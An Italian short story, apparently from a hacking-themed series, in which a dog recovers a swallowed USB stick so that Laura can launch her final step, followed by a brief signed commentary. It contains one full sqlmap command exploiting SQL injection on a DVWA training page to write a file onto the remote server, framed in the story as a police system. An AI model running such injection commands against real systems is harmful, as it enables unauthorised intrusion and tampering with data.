

Mancano pochi minuti alla mezzanotte.

Il terminale è pronto. La sessione SQLMap è ancora aperta. L’ultimo comando è già digitato, ma Laura aspetta il momento esatto per premere Invio. Rocky è sul divano, le orecchie dritte. La stanza è silenziosa. Solo il ronzio basso del portatile e il suono ritmico delle patatine Fonfis nella sua bocca. Mastica lentamente. Concentrazione alimentare.

Poi un rumore.

Un fruscio basso, rapido. Un’ombra. Un topo.

Spunta all’improvviso da dietro lo zaino, corre tra i cavi, si arrampica sulla scrivania. Laura scatta, fa cadere il pacchetto di Fonfis. Patatine ovunque. Il terminale resta esposto.

Il topo morde. Afferra la chiavetta USB.

Quella con il payload finale. Il file scritto da Laura per sovrascrivere `flag.txt` nel sistema remoto della Polizia Municipale. Nessuna copia. Nessun backup. Solo quella.

— “No, no, no…!”

Il topo sparisce sotto il tavolo.

Laura sta per muoversi, ma Rocky lo fa prima.

Scatta. Nessun abbaio. Nessuna esitazione.

Un colpo secco. Il topo non ha scampo. Rocky lo inghiotte in un solo movimento. Silenzio.

Laura si blocca. Tutto si ferma. Guarda il cane.

La chiavetta è dentro.

Poi, un rumore. Un colpo di tosse. Un altro. Un terzo.

Rocky spalanca la bocca e con uno spasmo getta fuori qualcosa. Un oggetto. La chiavetta.

Sporca. Ma intatta.

Laura la raccoglie. Nessun danno visibile. La inserisce.

Il terminale la riconosce. File localizzato.

Un comando.

```bash
sqlmap -u "http://35.228.25.146/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=qfk7580p1o5ip72j1tec0qrqv7; security=low" \
  --batch --no-cast \
  --file-write="/home/francesco/.local/share/sqlmap/output/35.228.25.146/files/_var_lib_mysql-files_flag.txt" \
  --file-dest="/var/lib/mysql-files/flag.txt"
```

Enter.

Lo script parte. Nessun errore. Tutto si carica.

**Missione completata.**

---

**\[Neurocriticum – Clara]**

*"L’anomalia non è tecnica. Clara osserva: l’ultima minaccia arriva dal reale. Ma Laura non cade. Recupera, reinserisce, chiude il cerchio. È il gesto, non il software, a salvare la missione."*

🛑

